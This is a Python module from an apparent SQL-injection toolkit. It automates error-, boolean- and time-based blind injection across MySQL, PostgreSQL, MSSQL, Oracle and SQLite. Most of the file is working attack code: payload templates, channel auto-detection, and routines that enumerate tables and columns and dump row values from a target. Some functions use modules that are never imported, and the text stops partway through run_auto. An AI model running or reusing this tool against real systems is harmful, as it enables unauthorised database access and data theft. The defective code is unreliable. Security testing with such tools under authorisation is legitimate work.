
# auto.py
# Channels: error, boolean, time.
# If request.txt has no {{%payload%}}, the scanner discovers points first.
# If no error/time hit and match.txt is empty, tries auto-boolean.

import os
import sys
import time
import datetime
import difflib
from pathlib import Path
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

from .binsearch import (
    ProbeCache,
    extract_char,
    extract_int,
    extract_string,
)
from .http_client import Client, MARKER, contains_match, status_of, body_of
from .exceptions import (
    RateLimitHit, RetryExhausted, SessionExpired, WafBlocked,
)
from . import error_based as EB


TABLES_MAX = 30
COLUMNS_MAX = 30
COUNT_TABLES_HI = 100000
COUNT_ROWS_HI = 1000000
LENGTH_HI = 200
DEBUG = False
FAST = False
PARALLEL = 1
LOCK = threading.Lock()
SETTINGS = {}



# ---------------------------------------------------------------------------
# Per-campaign debug log
# ---------------------------------------------------------------------------
#
# When run_auto(debug=True) is used, all debug output goes to
#     <campaign_dir>/debug/trace.log
# instead of stdout.  The path is resolved from the campaign dir that
# was passed on the command line, so it always lands next to results/.

import threading as _dbg_threading

_DBG_LOCK = _dbg_threading.Lock()
_DBG_STATE = {
    "path": None,      # Path or None
    "fh": None,        # open file handle or None
    "echo": True,      # also echo to stdout
    "req_dir": None,   # optional dir for raw bodies
    "counter": 0,
}


def dbg_init(campaign_dir, enabled=True, echo=True, save_bodies=False):
    """Initialise the debug log for this campaign.

    campaign_dir: Path to the folder that holds request.txt / match.txt.
    enabled:      if False, dbg() becomes a no-op and no folder is created.
    echo:         if True, also print to stdout.
    save_bodies:  if True, dump every response body to debug/requests/NNN.body
    """
    if not enabled:
        _DBG_STATE["path"] = None
        _DBG_STATE["fh"] = None
        return None
    dbg_dir = Path(campaign_dir).expanduser().resolve() / "debug"
    dbg_dir.mkdir(parents=True, exist_ok=True)
    path = dbg_dir / "trace.log"
    fh = open(path, "a", encoding="utf-8", buffering=1)
    _DBG_STATE["path"] = path
    _DBG_STATE["fh"] = fh
    _DBG_STATE["echo"] = echo
    _DBG_STATE["counter"] = 0
    if save_bodies:
        req_dir = dbg_dir / "requests"
        req_dir.mkdir(exist_ok=True)
        _DBG_STATE["req_dir"] = req_dir
    else:
        _DBG_STATE["req_dir"] = None
    return path


def dbg_close():
    fh = _DBG_STATE.get("fh")
    if fh is not None:
        try:
            fh.close()
        except Exception:
            pass
    _DBG_STATE["fh"] = None
    _DBG_STATE["path"] = None


def dbg(msg, echo=None):
    """Write one line to debug/trace.log (and optionally stdout)."""
    fh = _DBG_STATE.get("fh")
    do_echo = _DBG_STATE.get("echo") if echo is None else echo
    if fh is None:
        if do_echo:
            print(msg)
        return
    with _DBG_LOCK:
        try:
            fh.write(msg + "\n")
        except Exception:
            pass
    if do_echo:
        print(msg)


def dbg_next_index():
    with _DBG_LOCK:
        _DBG_STATE["counter"] += 1
        return _DBG_STATE["counter"]


def dbg_save_body(idx, body):
    """Save a response body to debug/requests/NNN.body if enabled."""
    req_dir = _DBG_STATE.get("req_dir")
    if req_dir is None:
        return None
    p = req_dir / f"{idx:04d}.body"
    try:
        p.write_text(body, encoding="utf-8")
    except Exception:
        return None
    return p



_STATE_LOCK = threading.Lock()


def _state_path(cdir):
    return Path(cdir) / "debug" / "state.json"


def save_state(cdir, **kwargs):
    """Save resume state to <campaign>/debug/state.json."""
    p = _state_path(cdir)
    p.parent.mkdir(parents=True, exist_ok=True)
    with _STATE_LOCK:
        try:
            cur = {}
            if p.exists():
                try:
                    cur = json.loads(p.read_text(encoding="utf-8")) or {}
                except Exception:
                    cur = {}
            cur.update(kwargs)
            cur["saved_at"] = datetime.datetime.now().isoformat(timespec="seconds")
            p.write_text(json.dumps(cur, indent=2, ensure_ascii=False),
                         encoding="utf-8")
        except Exception:
            pass


def load_state(cdir):
    p = _state_path(cdir)
    if not p.exists():
        return {}
    try:
        return json.loads(p.read_text(encoding="utf-8")) or {}
    except Exception:
        return {}


def clear_state(cdir):
    p = _state_path(cdir)
    try:
        if p.exists():
            p.unlink()
    except Exception:
        pass



DIALECT = {
    "mysql": {
        "substr": "SUBSTRING", "ascii": "ASCII", "length": "LENGTH",
        "tables_from": "information_schema.tables",
        "tables_where": "table_schema=database()",
        "cols_from": "information_schema.columns",
        "cols_where": "table_name='{t}'",
        "count_tables": "(SELECT COUNT(*) FROM information_schema.tables "
                        "WHERE table_schema=database())",
        "limit1": "LIMIT 1 OFFSET {o}",
        "sleep": "SLEEP({d})",
        "sleep_cond": "IF(({c}), SLEEP({d}), 0)",
        "version_like": [
            "(SELECT LENGTH(@@version))>0",
        ],
    },
    "postgres": {
        "substr": "SUBSTRING", "ascii": "ASCII", "length": "LENGTH",
        "tables_from": "information_schema.tables",
        "tables_where": "table_schema=current_schema()",
        "cols_from": "information_schema.columns",
        "cols_where": "table_name='{t}'",
        "count_tables": "(SELECT COUNT(*) FROM information_schema.tables "
                        "WHERE table_schema=current_schema())",
        "limit1": "LIMIT 1 OFFSET {o}",
        "sleep": "pg_sleep({d})",
        "sleep_cond": "(SELECT 1 FROM (SELECT CASE WHEN ({c}) "
                      "THEN pg_sleep({d}) END) x)",
        "version_like": [
            "(SELECT LENGTH(version()))>0",
        ],
    },
    "mssql": {
        "substr": "SUBSTRING", "ascii": "ASCII", "length": "LEN",
        "tables_from": "information_schema.tables",
        "tables_where": "1=1",
        "cols_from": "information_schema.columns",
        "cols_where": "table_name='{t}'",
        "count_tables": "(SELECT COUNT(*) FROM information_schema.tables)",
        "limit1": "ORDER BY (SELECT NULL) OFFSET {o} ROWS FETCH NEXT 1 ROWS ONLY",
        "sleep": "WAITFOR DELAY '0:0:{d}'",
        "sleep_cond": "1=1; IF ({c}) WAITFOR DELAY '0:0:{d}'",
        "version_like": ["(SELECT @@version) LIKE 'Microsoft%'"],
    },
    "oracle": {
        "substr": "SUBSTR", "ascii": "ASCII", "length": "LENGTH",
        "tables_from": "user_tables",
        "tables_where": "1=1",
        "cols_from": "user_tab_columns",
        "cols_where": "table_name='{t}'",
        "count_tables": "(SELECT COUNT(*) FROM user_tables)",
        "limit1": "OFFSET {o} ROWS FETCH NEXT 1 ROWS ONLY",
        "sleep": "dbms_pipe.receive_message(('a'),{d})",
        "sleep_cond": "1=(SELECT 1 FROM dual WHERE ({c}) "
                      "AND dbms_pipe.receive_message(('a'),{d})=1)",
        "version_like": [
            "(SELECT LENGTH(banner) FROM v$version WHERE ROWNUM=1)>0",
        ],
    },
    "sqlite": {
        "substr": "SUBSTR", "ascii": "UNICODE", "length": "LENGTH",
        "tables_from": "sqlite_master",
        "tables_where": "type='table'",
        "cols_from": "pragma_table_info('{t}')",
        "cols_where": "1=1",
        "count_tables": "(SELECT COUNT(*) FROM sqlite_master WHERE type='table')",
        "limit1": "LIMIT 1 OFFSET {o}",
        "sleep": "(SELECT 1 FROM (SELECT 1) WHERE 1=randomblob(100000000))",
        "sleep_cond": "1=(SELECT 1 FROM (SELECT 1) WHERE ({c}) "
                      "AND 1=randomblob(100000000))",
        "version_like": [
            "(SELECT LENGTH(sqlite_version()))>0",
        ],
    },
}


class Prober:
    def __init__(self, client, cfg=None, prefix="'", suffix="'--",
                 marker="", technique="boolean", delay=5,
                 dialect="oracle", error_codes=(500,),
                 error_template="", debug=False,
                 campaign_dir=None, cache=None,
                 worker_id=0, parallel=1):
        self.cfg = cfg
        self.cache = cache
        self.worker_id = int(worker_id)
        self.parallel = max(1, int(parallel))
        self.client = client
        self.prefix = prefix
        self.suffix = suffix
        self.marker = marker
        self.technique = technique
        self.delay = delay
        self.dialect = dialect
        self.d = DIALECT[dialect]
        self.error_codes = error_codes
        self.error_template = error_template
        self.debug = debug
        self.campaign_dir = campaign_dir
        self.requests = 0

    def raw_send(self, sql):
        self.requests += 1
        idx = self.requests
        if self.cfg is not None and self.cfg.max_total:
            if self.requests > self.cfg.max_total:
                from .exceptions import RateLimitHit
                raise RateLimitHit(
                    f"max_total={self.cfg.max_total} exceeded "
                    f"(Prober sent {self.requests})"
                )
        if self.debug:
            dbg(f"    [{idx}] sql={sql!r}")
        t0 = time.time()
        r = self.client.send(sql)
        dt = time.time() - t0
        if self.debug:
            st = status_of(r)
            ln = len(body_of(r))
            dbg(f"    [{idx}] -> {st} len={ln} dt={dt:.3f}s")
            try:
                dbg_save_body(idx, body_of(r))
            except Exception:
                pass
        return r

    def probe(self, condition):
        if self.technique == "boolean":
            sql = f"{self.prefix} AND ({condition}){self.suffix}"
            r = self.raw_send(sql)
            return contains_match(body_of(r), self.marker)
        if self.technique == "time":
            expr = self.d["sleep_cond"].format(c=condition, d=self.delay)
            sql = f"{self.prefix} AND {expr}{self.suffix}"
            t0 = time.time()
            self.raw_send(sql)
            return (time.time() - t0) >= self.delay * 0.5
        if self.technique == "error":
            if not self.error_template:
                raise RuntimeError("error template not set")
            sql = EB.build_payload(self.error_template, condition,
                                   prefix=self.prefix, suffix=self.suffix)
            r = self.raw_send(sql)
            return status_of(r) in self.error_codes
        raise ValueError(f"unknown technique: {self.technique}")

    def table_sub(self, offset):
        d = self.d
        if self.dialect == "oracle":
            if offset == 0:
                return "(SELECT table_name FROM user_tables WHERE ROWNUM=1)"
            return (f"(SELECT table_name FROM "
                    f"(SELECT table_name, ROWNUM rn FROM user_tables) "
                    f"WHERE rn={offset + 1})")
        lim = d["limit1"].format(o=offset)
        return (f"(SELECT table_name FROM {d['tables_from']} "
                f"WHERE {d['tables_where']} ORDER BY table_name {lim})")

    def column_sub(self, table, offset):
        d = self.d
        if self.dialect == "sqlite":
            lim = d["limit1"].format(o=offset)
            return (f"(SELECT name FROM pragma_table_info('{table}') "
                    f"ORDER BY name {lim})")
        if self.dialect == "oracle":
            t = table.upper()
            if offset == 0:
                return (f"(SELECT column_name FROM user_tab_columns "
                        f"WHERE table_name='{t}' AND ROWNUM=1)")
            return (f"(SELECT column_name FROM "
                    f"(SELECT column_name, ROWNUM rn FROM user_tab_columns "
                    f"WHERE table_name='{t}') "
                    f"WHERE rn={offset + 1})")
        lim = d["limit1"].format(o=offset)
        return (f"(SELECT column_name FROM {d['cols_from']} "
                f"WHERE {d['cols_where'].format(t=table)} "
                f"ORDER BY column_name {lim})")

    def length_of(self, expr):
        # Sanity: the channel must still answer 1=1 / 1=2 correctly.
        # Without this guard a broken channel silently returns 0 and
        # the caller thinks the value is empty.
        try:
            if not self.probe("1=1") or self.probe("1=2"):
                if self.debug:
                    dbg("    [length_of] channel sanity failed")
                return 0
        except Exception:
            return 0
        try:
            return extract_int(self.probe, f"{self.d['length']}({expr})",
                               hi=LENGTH_HI, debug=self.debug,
                               cfg=self.cfg, cache=self.cache)
        except OverflowError:
            return 0

    def string_of(self, expr):
        n = self.length_of(expr)
        if n <= 0:
            return ""
        # Parallel extraction is only safe for boolean/error channels.
        # Time-based probes rely on wall-clock deltas and will collide
        # when several requests run at once.
        if PARALLEL <= 1 or self.technique == "time":
            return extract_string(self.probe, expr, n,
                                  substr=self.d["substr"],
                                  ascii_fn=self.d["ascii"],
                                  debug=self.debug,
                                  cfg=self.cfg, cache=self.cache)
        lo = 32 if FAST else 0
        return _extract_string_parallel(self, expr, n, lo, 255)


# Prefix/suffix candidates come from scanner.py (single source of truth).
from .scanner import PREFIX_CANDIDATES  # noqa: E402

DIALECT_PRIORITY = ["oracle", "postgres", "mssql", "mysql", "sqlite"]


def _status(pr, sql):
    return status_of(pr.raw_send(sql))


def auto_detect_error(pr):
    print("  enumerating error templates (collect all matches) ...")
    matches = []
    for prefix, suffix in PREFIX_CANDIDATES:
        pw = PREFIX_CANDIDATES.index((prefix, suffix))
        for dialect in EB.all_error_dialects():
            dw = DIALECT_PRIORITY.index(dialect) if dialect in DIALECT_PRIORITY else 99
            for name, tpl in EB.templates_for(dialect):
                try:
                    t_sql = EB.build_payload(tpl, "1=1",
                                             prefix=prefix, suffix=suffix)
                    f_sql = EB.build_payload(tpl, "1=2",
                                             prefix=prefix, suffix=suffix)
                    st_t1 = _status(pr, t_sql)
                    st_f1 = _status(pr, f_sql)
                    st_t2 = _status(pr, t_sql)
                    st_f2 = _status(pr, f_sql)
                except Exception as e:
                    dbg(f"    [{dialect:9}/{name:24}] "
                        f"p={prefix!r:6} s={suffix!r:6}  EXC {e!r}")
                    continue
                ok_t = (st_t1 in pr.error_codes) and (st_t2 in pr.error_codes)
                ok_f = (st_f1 not in pr.error_codes) and (st_f2 not in pr.error_codes)
                match = ok_t and ok_f
                mark = "  <== MATCH" if match else ""
                dbg(f"    [{dialect:9}/{name:24}] "
                    f"p={prefix!r:6} s={suffix!r:6}  "
                    f"1=1:{st_t1:>3}/{st_t2:>3}  "
                    f"1=2:{st_f1:>3}/{st_f2:>3}{mark}")
                if match:
                    matches.append((pw, dw, dialect, prefix, suffix, name, tpl))

    if not matches:
        return None

    print(f"\n  collected {len(matches)} matches; sorting by priority:")
    for m in matches:
        print(f"    pw={m[0]:>2} dw={m[1]:>2} dialect={m[2]:9} "
              f"prefix={m[3]!r} suffix={m[4]!r} template={m[5]}")

    matches.sort(key=lambda m: (m[0], m[1]))
    pw, dw, dialect, prefix, suffix, name, tpl = matches[0]
    print(f"  ==> chosen: dialect={dialect} template={name} "
          f"prefix={prefix!r} suffix={suffix!r}")
    return (dialect, prefix, suffix, name, tpl)


def auto_detect_boolean(pr, marker):
    if not marker:
        return None
    for p, s in PREFIX_CANDIDATES:
        pr.prefix, pr.suffix = p, s
        try:
            r1 = pr.raw_send(f"{p} AND (1=1){s}")
            r2 = pr.raw_send(f"{p} AND (1=2){s}")
            t = contains_match(body_of(r1), marker)
            f = contains_match(body_of(r2), marker)
            print(f"  try {p!r:6} / {s!r:6}  "
                  f"1=1: status={status_of(r1)} len={len(body_of(r1))} match={t}  |  "
                  f"1=2: status={status_of(r2)} len={len(body_of(r2))} match={f}")
            if t and not f:
                return p, s
        except Exception as e:
            print(f"  try {p!r:6} / {s!r:6}  EXCEPTION: {e!r}")
    return None


def auto_detect_time(pr):
    print("  trying time-based for every dialect ...")
    for p, s in PREFIX_CANDIDATES:
        pr.prefix, pr.suffix = p, s
        for db, frag in DIALECT.items():
            try:
                expr = frag["sleep_cond"].format(c="1=1", d=pr.delay)
                sql = f"{p} AND {expr}{s}"
                t0 = time.time()
                pr.raw_send(sql)
                dt = time.time() - t0
                if dt >= pr.delay * 0.5:
                    print(f"  time ok: {db}  {p!r}/{s!r}  delay={dt:.2f}s")
                    return db, p, s
            except Exception:
                continue
    return None



def _progress(tag, done, total, t0, extra=""):
    """Print a one-line ASCII progress bar with ETA."""
    if total <= 0:
        return
    width = 20
    frac = min(1.0, done / float(total))
    filled = int(width * frac)
    bar = "#" * filled + ">" + " " * max(0, width - filled - 1)
    elapsed = max(0.001, _time.time() - t0)
    if done > 0:
        eta = elapsed / done * (total - done)
        eta_s = f"~{int(eta)}s left"
    else:
        eta_s = "..."
    line = f"  [{tag:12}] {done:>3}/{total:<3} [{bar}] {eta_s}"
    if extra:
        line += f"  {extra}"
    print(line, flush=True)


def pause(step):
    print(f"\n[STEP] {step}")
    try:
        a = input("  press Enter to run, 's' to skip, 'q' to quit > ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    if a == "q":
        return None
    if a == "s":
        return "skip"
    return "ok"


def ask(prompt, default=""):
    try:
        s = input(f"{prompt}" + (f" [{default}]: " if default else ": ")).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    return s or default


class Results:
    def __init__(self, campaign_dir, dialect, technique, target):
        results_dir = campaign_dir / "results"
        results_dir.mkdir(exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.path = results_dir / f"results_{ts}.txt"
        self.f = None
        self.header = (
            f"# SQLi Helper auto run\n"
            f"# started:   {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n"
            f"# dialect:   {dialect}\n"
            f"# technique: {technique}\n"
            f"# target:    {target}\n\n"
        )

    def _ensure(self):
        if self.f is None:
            self.f = open(self.path, "w", encoding="utf-8")
            self.f.write(self.header)
            self.f.flush()

    def _w(self, line):
        self._ensure()
        self.f.write(line + "\n")
        self.f.flush()

    def section(self, name):
        self._ensure()
        self._w(f"[{name}]")

    def kv(self, key, value):
        self._ensure()
        self._w(f"{key}: {value}")

    def raw(self, line):
        self._ensure()
        self._w(line)

    def close(self):
        if self.f is not None:
            self.f.close()


def _extract_string_parallel(pr, expr, n, lo, hi):
    """Extract `n` chars of `expr` in parallel.

    Each worker gets its own Client with worker_id=i+1 and
    parallel=PARALLEL, so the per-worker throttle is max_rps/PARALLEL.
    Cache is shared (thread-safe).
    """
    from .binsearch import extract_char
    from .http_client import Client as _HCClient

    results = [""] * n
    raw_req = pr.client.req.raw
    cfg = pr.cfg

    def make_worker_prober(wid):
        cli = _HCClient(raw_req, cfg, worker_id=wid,
                        parallel=PARALLEL)
        p = Prober(cli, cfg=cfg, prefix=pr.prefix, suffix=pr.suffix,
                   marker=pr.marker, technique=pr.technique,
                   delay=pr.delay, dialect=pr.dialect,
                   error_codes=pr.error_codes,
                   error_template=pr.error_template,
                   debug=pr.debug, campaign_dir=pr.campaign_dir,
                   cache=pr.cache, worker_id=wid, parallel=PARALLEL)
        return p

    def worker(args):
        pos, wid = args
        p = make_worker_prober(wid)
        ch = extract_char(p.probe, expr, pos,
                          substr=p.d["substr"],
                          ascii_fn=p.d["ascii"],
                          lo=lo, hi=hi, debug=False,
                          cfg=cfg, cache=pr.cache)
        return pos, ch

    with ThreadPoolExecutor(max_workers=PARALLEL) as ex:
        jobs = [(i, i + 1) for i in range(1, n + 1)]
        futs = [ex.submit(worker, j) for j in jobs]
        for fut in as_completed(futs):
            pos, ch = fut.result()
            results[pos - 1] = ch
    return "".join(results).rstrip("\x00")


def step_count_tables(pr, res):
    if pause("count tables in current schema") != "ok":
        return 0
    try:
        low = pr.probe(f"({pr.d['count_tables']})>0")
        high = pr.probe(f"({pr.d['count_tables']})>{COUNT_TABLES_HI}")
    except Exception as e:
        print(f"  !! sanity probe failed: {e!r}")
        return 0
    print(f"  sanity: >0 -> {low}   >{COUNT_TABLES_HI} -> {high}")
    if not low or high:
        print("  !! sanity failed; channel looks broken")
        return 0
    try:
        n = extract_int(pr.probe, pr.d["count_tables"], hi=COUNT_TABLES_HI)
    except OverflowError as e:
        print(f"  !! count overflow: {e}")
        return 0
    print(f"  tables: {n}")
    res.section("tables.count")
    res.kv("count", n)
    return n


def step_table_names(pr, n, res):
    if n > TABLES_MAX:
        print(f"  !! {n} tables exceeds TABLES_MAX={TABLES_MAX}")
        n = TABLES_MAX
    if pause(f"read {n} table names") != "ok":
        return []
    names = []
    for i in range(n):
        sub = pr.table_sub(i)
        name = pr.string_of(sub)
        print(f"  [{i}] {name!r}")
        if name:
            names.append(name)
    res.section("tables")
    for name in names:
        res.raw(name)
    return names


def step_count_columns(pr, table, res):
    if pause(f"count columns of '{table}'") != "ok":
        return 0
    d = pr.d
    if pr.dialect == "sqlite":
        base, where = f"pragma_table_info('{table}')", "1=1"
    elif pr.dialect == "oracle":
        base, where = "user_tab_columns", f"table_name='{table.upper()}'"
    else:
        base, where = d["cols_from"], d["cols_where"].format(t=table)
    try:
        n = extract_int(pr.probe, f"(SELECT COUNT(*) FROM {base} WHERE {where})",
                        hi=1000)
    except OverflowError as e:
        print(f"  !! count overflow: {e}")
        return 0
    print(f"  columns: {n}")
    res.section(f"{table}.columns.count")
    res.kv("count", n)
    return n


def step_column_names(pr, table, n, res):
    if n > COLUMNS_MAX:
        print(f"  !! {n} columns exceeds COLUMNS_MAX={COLUMNS_MAX}")
        n = COLUMNS_MAX
    if pause(f"read {n} column names of '{table}'") != "ok":
        return []
    cols = []
    for i in range(n):
        sub = pr.column_sub(table, i)
        name = pr.string_of(sub)
        print(f"  [{i}] {name!r}")
        if name:
            cols.append(name)
    res.section(f"{table}.columns")
    for c in cols:
        res.raw(c)
    return cols


def step_count_rows(pr, table, res):
    if pause(f"count rows in '{table}'") != "ok":
        return 0
    try:
        n = extract_int(pr.probe, f"(SELECT COUNT(*) FROM {table})",
                        hi=COUNT_ROWS_HI)
    except OverflowError as e:
        print(f"  !! count overflow: {e}")
        return 0
    print(f"  rows: {n}")
    res.section(f"{table}.rows.count")
    res.kv("count", n)
    return n


def step_wordlist_check(pr, table, column, words, res):
    if pause(f"check wordlist against {table}.{column}") != "ok":
        return []
    hits = []
    for w in words:
        esc = w.replace("'", "''")
        cond = f"EXISTS(SELECT 1 FROM {table} WHERE {column}='{esc}')"
        try:
            ok = pr.probe(cond)
        except Exception as e:
            print(f"  [{w}] EXCEPTION {e!r}")
            continue
        mark = "HIT" if ok else "   "
        print(f"  [{mark}] {w}")
        if ok:
            hits.append(w)
    res.section(f"{table}.{column}.hits")
    for h in hits:
        res.raw(h)
    return hits


def step_dump_rows(pr, table, key_col, key_values, other_cols, res):
    if not other_cols:
        return
    for kv in key_values:
        if pause(f"dump {table} where {key_col}='{kv}'") != "ok":
            continue
        esc = kv.replace("'", "''")
        for col in other_cols:
            if col == key_col:
                continue
            if pr.dialect == "oracle":
                sub = (f"(SELECT {col} FROM {table} "
                       f"WHERE {key_col}='{esc}' AND ROWNUM=1)")
            else:
                sub = (f"(SELECT {col} FROM {table} "
                       f"WHERE {key_col}='{esc}' LIMIT 1)")
            val = pr.string_of(sub) or "(null)"
            print(f"    {col}: {val}")
            res.section(f"{table} where {key_col}='{kv}'")
            res.kv(col, val)



def _pick_best_marker(candidates, txt_t, txt_f):
    """Pick the most likely boolean marker, hard-preferring clean text.

    Strategy:
      1) Aggressively strip HTML from each candidate and from the bodies.
      2) Score candidates by text purity, uniqueness, and length.
      3) Prefer substrings of the body that we can reliably search for.
    """
    import re as _re
    if not candidates:
        return ""

    def strip_html(s: str) -> str:
        s = _re.sub(r"<[^>]*>", "", s)
        s = _re.sub(r"\s+", " ", s)
        return s.strip()

    txt_t_text = strip_html(txt_t)
    txt_f_text = strip_html(txt_f)

    def score(s: str) -> float:
        n = len(s)
        if n < 4:
            return -100.0

        # Hard reject HTML-ish strings
        if "<" in s or ">" in s:
            base = -20.0
        else:
            base = 0.0

        # Length: strongly prefer 4..40, penalise >60
        if 4 <= n <= 40:
            base += 8.0
        elif n <= 60:
            base += 4.0
        else:
            base -= (n - 60) / 5.0

        # Text purity: how much of it is texty chars
        texty = sum(c.isalnum() or c in " !?.,:;-_" for c in s)
        purity = texty / max(1, n)
        base += 10.0 * purity

        # Uniqueness in TRUE
        if txt_t.count(s) == 1:
            base += 4.0
        # Absence in FALSE
        if s not in txt_f:
            base += 3.0
        # Presence in stripped TRUE
        if txt_t_text.count(s) == 1:
            base += 4.0
        if s not in txt_f_text:
            base += 3.0

        # Explicit magic markers
        low = s.lower()
        if "welcome back" in low:
            base += 15.0
        elif "welcome" in low:
            base += 8.0
        elif any(m in low for m in ("success", "logged in",
                                     "you are", "hello,", "account")):
            base += 6.0

        # Penalise leading/trailing whitespace
        if s != s.strip():
            base -= 2.0

        return base

    # 1) First try: candidates that are already clean text
    clean = [c for c in candidates if "<" not in c and ">" not in c]
    pool = clean if clean else candidates

    ranked = sorted(pool, key=score, reverse=True)
    best = ranked[0]

    # 2) If best still contains HTML, try stripping it and check if the
    #    stripped version is a valid substring of stripped TRUE.
    if "<" in best or ">" in best:
        stripped = strip_html(best)
        if stripped and stripped in txt_t_text and stripped not in txt_f_text:
            return stripped

    return best


def _diff_candidates(a, b):
    # Returns a list of unique substrings present in b and not in a.
    # Sorted: longest meaningful first, then shorter variants.
    if a == b:
        return []
    sm = difflib.SequenceMatcher(None, a, b, autojunk=False)
    raw_diffs = []
    pos_b = 0
    for blk in sm.get_matching_blocks():
        if blk.b > pos_b:
            raw_diffs.append(b[pos_b:blk.b])
        pos_b = blk.b + blk.size

    candidates = []
    seen = set()

    def add(s):
        if not s:
            return
        if s in seen:
            return
        seen.add(s)
        candidates.append(s)

    # 1) longest raw chunk (may contain \n and spaces)
    cleaned = []
    for d in raw_diffs:
        stripped = d.strip()
        if len(stripped) >= 4:
            cleaned.append(stripped)
    if cleaned:
        add(max(cleaned, key=len))

    # 2) each diff collapsed to one line
    for d in raw_diffs:
        one = ' '.join(d.split())
        if len(one) >= 4:
            add(one)

    # 3) inner text-only candidate: strip leading/trailing tags
    for d in raw_diffs:
        t = d.strip()
        # remove leading '>...' and trailing '<...'
        if '>' in t:
            t2 = t.split('>', 1)[1] if t.index('>') < 3 else t
        else:
            t2 = t
        if '<' in t2:
            t3 = t2.rsplit('<', 1)[0]
        else:
            t3 = t2
        t3 = t3.strip()
        if 4 <= len(t3) <= 200:
            add(t3)

    # 4) longest-line only
    for d in raw_diffs:
        for line in d.split('\n'):
            line = line.strip()
            if 8 <= len(line) <= 200:
                add(line)

    # sort: prefer the longest per group, but keep order stable
    return candidates


def _baseline_raw(client, raw):
    from .http_client import RawRequest
    req = RawRequest(raw)
    kw = req.render("")
    r = client.session.request(
        kw["method"], kw["url"],
        headers=kw["headers"], data=kw["data"],
        allow_redirects=False, timeout=30,
    )
    return r


def auto_bool_marker(client, raw, point, prefix, suffix,
                     interactive=None, cfg=None):
    if interactive is None:
        if cfg is not None:
            interactive = not cfg.non_interactive
        else:
            interactive = True
    # Compare TRUE/FALSE responses at `point` and return a marker.
    # If interactive=True, offer the user a numbered menu.
    from .scanner import build_request_for_point
    patched = build_request_for_point(raw, point)

    t_sql = f"{prefix} AND (1=1){suffix}"
    f_sql = f"{prefix} AND (1=2){suffix}"
    try:
        r_t = _send_raw(client, patched.replace(MARKER, t_sql))
        r_f = _send_raw(client, patched.replace(MARKER, f_sql))
    except Exception as e:
        print(f"    auto-bool exception: {e!r}")
        return ""

    if status_of(r_t) != status_of(r_f):
        return f"__status_{status_of(r_t)}"

    txt_t = body_of(r_t)
    txt_f = body_of(r_f)
    candidates = _diff_candidates(txt_f, txt_t)
    if not candidates:
        candidates = _diff_candidates(txt_t, txt_f)
    if not candidates:
        return ""

    if not interactive:
        picked = _pick_best_marker(candidates, txt_t, txt_f)
        try:
            from .auto import dbg as _dbg  # self-import; safe at runtime
        except Exception:
            _dbg = None
        if _dbg is not None:
            _dbg(f"    [auto-bool] picked marker={picked!r} "
                 f"from {len(candidates)} candidates")
        return picked

    # interactive menu
    print("\n    [auto-boolean] found differences. Pick a marker:")
    for i, c in enumerate(candidates, 1):
        preview = c.replace("\n", "\\n")
        if len(preview) > 80:
            preview = preview[:77] + "..."
        print(f"      [{i}] {preview!r}")
    print("      [0] skip this point")
    print("      [c] type your own marker")

    while True:
        try:
            a = input("    choice: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return ""
        if a == "0":
            return ""
        if a.lower() == "c":
            try:
                custom = input("    marker: ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return ""
            return custom
        if a.isdigit() and 1 <= int(a) <= len(candidates):
            return candidates[int(a) - 1]
        print("    ! invalid choice")


def _send_raw(client, raw):
    from .http_client import RawRequest
    req = RawRequest(raw)
    kw = req.render("")
    return client.session.request(
        kw["method"], kw["url"],
        headers=kw["headers"], data=kw["data"],
        allow_redirects=False, timeout=30,
    )


def _rebuild_raw_with_hit(raw, hit):
    from .scanner import build_request_for_point
    return build_request_for_point(raw, hit.point)


def _load_settings(cdir, cli_rps=None, cli_parallel=None,
                   cli_delay=None, cli_timeout=None):
    import json
    s = {}
    p = cdir / "settings.json"
    if p.exists():
        try:
            s = json.loads(p.read_text(encoding="utf-8")) or {}
            print(f"  settings:  loaded {p.name}: {s}")
        except Exception as e:
            print(f"  !! settings.json parse error: {e!r}")
            s = {}
    # CLI overrides settings
    if cli_rps is not None:
        s["rps"] = cli_rps
    if cli_parallel is not None:
        s["parallel"] = cli_parallel
    if cli_delay is not None:
        s["delay"] = cli_delay
    if cli_timeout is not None:
        s["timeout"] = cli_timeout
    return s



def _preflight_sanity(pr, cfg, samples=2):
    """Check the channel is stable before extraction.

    Returns True if we should proceed. Prints a short report.
    """
    try:
        t = pr.probe("1=1")
        f = pr.probe("1=2")
    except Exception as e:
        print(f"  !! sanity probe raised: {e!r}")
        return False
    ok_channel = bool(t) and not bool(f)
    print(f"  sanity: 1=1 -> {t}   1=2 -> {f}")
    if not ok_channel:
        return False

    if pr.technique in ("boolean", "error"):
        lens = []
        for _ in range(samples):
            try:
                r = pr.raw_send(f"{pr.prefix} AND (1=1){pr.suffix}")
                lens.append(len(body_of(r)))
            except Exception:
                pass
        if len(lens) >= 2:
            lo, hi = min(lens), max(lens)
            if hi > 0 and (hi - lo) / max(1, hi) > 0.30:
                print(f"  ! target unstable: body len varies "
                      f"{lo}..{hi} ({100*(hi-lo)//max(1,hi)}%)")
                print(f"  ! consider --delay or lower --max-rps")
    return True


def run_auto(cfg_or_dir, delay=5, dry_run=False,
             debug=False, fast=False, scan_all=False,
             non_interactive=False, parallel=None,
             rps=None, timeout=None, no_throttle=False):
    """Run the auto pipeline.

    Accepts either a Config instance (preferred) or the legacy
    positional arguments. Legacy calls emit a DeprecationWarning.
    """
    from .config import Config
    from .exceptions import SQLiToolkitError
    if isinstance(cfg_or_dir, Config):
        cfg = cfg_or_dir
    else:
        import warnings as _w
        _w.warn(
            "run_auto(campaign_dir, delay, ...) is deprecated; "
            "pass a Config instance instead",
            DeprecationWarning, stacklevel=2,
        )
        cfg = Config(
            campaign_dir=cfg_or_dir,
            delay=delay, debug=debug, fast=fast,
            scan_all=scan_all, non_interactive=non_interactive,
            parallel=parallel if parallel is not None else 1,
            max_rps=rps if rps is not None else 10.0,
            timeout=timeout if timeout is not None else 30,
            no_throttle=no_throttle,
            permission_granted=True,   # legacy callers
        )
    campaign_dir = cfg.campaign_dir
    delay = cfg.delay
    dry_run = dry_run
    debug = cfg.debug
    fast = cfg.fast
    scan_all = cfg.scan_all
    non_interactive = cfg.non_interactive
    parallel = cfg.parallel
